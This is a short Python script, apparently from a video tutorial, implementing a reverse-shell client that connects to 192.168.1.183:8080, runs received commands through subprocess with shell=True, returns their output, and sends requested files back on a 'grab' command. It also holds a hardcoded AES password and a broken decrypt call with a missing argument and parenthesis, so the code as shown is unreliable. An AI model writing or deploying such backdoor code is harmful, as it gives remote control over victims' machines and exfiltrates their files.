import socket
import subprocess # See video https://www.youtube.com/watch?v=2Fp1N6dof0Y
import os
from Crypto.Cipher import AES
import hashlib
import sys
import binascii
import Padding

password='hello'
ival=10
#command is the data we will encrypt ie the plaintext

def encrypt(plaintext,key, mode,iv):
    encobj = AES.new(key,mode,iv)
    return(encobj.encrypt(plaintext))

def decrypt(ciphertext,key, mode,iv):
    encobj = AES.new(key,mode,iv)
    return(encobj.decrypt(ciphertext))



def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send("DONE".encode())
    else:
        s.send("File not found".encode())


def connect():
    s = socket.socket()
    s.connect(("192.168.1.183",8080))
    while True:
        command = decrypt(s.recv(1024)
        if "terminate" in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            # Recieve the command  
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        else:
            # See the video above which explains how the subprocess element works
            # A pipe has two endpoints
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
            #Capture the standout and send the output to the server
            s.send(CMD.stdout.read())
            # Capture any command errors and send the 
            s.send(CMD.stderr.read())

def main():
    connect()
main()
